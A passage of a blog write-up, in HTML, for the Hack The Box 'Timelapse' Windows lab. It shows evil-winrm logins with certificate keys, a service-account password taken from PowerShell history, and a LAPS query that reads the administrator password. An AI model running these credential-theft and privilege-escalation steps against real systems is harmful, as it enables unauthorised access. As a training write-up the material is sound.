+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ openssl rsa -in timelapse.pem -out timelapse.key
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">writing RSA key
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With the generated key files i can run evil-winrm again:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.152 -k timelapse.key -c cert.pem -S
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="user-flag">User flag</h3>
+<p>After getting in, i can CD to the user Desktop and type the user.txt file to get the flag.</p>
+<h3 id="previlege-escalation">Previlege escalation</h3>
+<p>The windows equivalent of <strong>.bash_history</strong> is <strong>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</strong>.</p>
+<p>The following commands seem to enable to run the command <strong>whoami</strong> as the user **svc_deploy **</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$p = ConvertTo-SecureString &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -AsPlainText -Force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$c = New-Object System.Management.Automation.PSCredential (&#39;svc_deploy&#39;, $p)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After running a few commands for testing, i&rsquo;ll try to change <strong>svc_deploy</strong> to <strong>administrator</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Connecting to remote server localhost failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    + CategoryInfo          : OpenError: (localhost:String) [], PSRemotingTransportException
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>That would be too easy but i had to try. I believe that the SecureString parameter might be present in some other place. Reading through the docs there might be a way to use powershell to reset admin password.</p>
+<p>After running <strong>winPEAS.bat</strong> one of the items checked was a LAPS password. The documents that i got earlier in enumeration pointed to this feature as having a clear text password for the Administrator account.</p>
+<p>After a little nudge on the discord it became clear that the way in is with the svc_deploy user account. So, let&rsquo;s try to get in using evil-winrm again, this time with the credentials exposed in the powershell history.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.152 -u svc_deploy -S -s ./
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enter Password:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After opening a winrm session i tried looking for folders but with no luck. This account has no previleges to look inside other users folders. But, the username sounds like something that the app that i downloaded would use to access the LAPS subsystem. Let&rsquo;s see if i can get that password with a few powershell commands.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM* PS C:\Users&gt; $laps = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime -Server DC01 | ? {$_.&#39;ms-Mcs-AdmPwd&#39;} | select Name,ms-Mcs-AdmPwd,@{label=&#34;ExpDate&#34;;Expression={([datetime]::FromFileTime([convert]::ToInt64($_.&#39;ms-Mcs-AdmPwdExpirationTime&#39;)))}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users&gt; $laps
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name ms-Mcs-AdmPwd            ExpDate
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---- -------------            -------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DC01 &lt;redacted&gt; 4/14/2022 12:51:12 PM
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And there is the administrator password. I can now logon as an administrator and check for folders with the root flag. It&rsquo;s inside another user&rsquo;s desktop.</p>
+<p>Overall an easier box that what i&rsquo;m used to, made difficult because it was the first windows box that i tried on HTB.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/privesc/">privesc</a>
+        
+            <a href="/tags/flag/">flag</a>
+        
+            <a href="/tags/root/">root</a>
+        
+            <a href="/tags/writeup/">writeup</a>
+        
+            <a href="/tags/tryhackme/">tryhackme</a>
+        
+            <a href="/tags/easy/">easy</a>
+        
+            <a href="/tags/windows/">windows</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cat/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Cat</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/eternal-loop/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Eternal loop</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/eternal-loop/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Eternal loop</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/baby-encription/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Baby Encription</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/behind-the-scenes/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Behind the scenes</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2018 - 
+        
+        2022 phire heavy industries
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#assessment">assessment</a></li>
+      </ol>
+    </li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#nmap">nmap</a></li>
+    <li><a href="#smb">smb</a></li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#user-flag">User flag</a></li>
+        <li><a href="#previlege-escalation">Previlege escalation</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
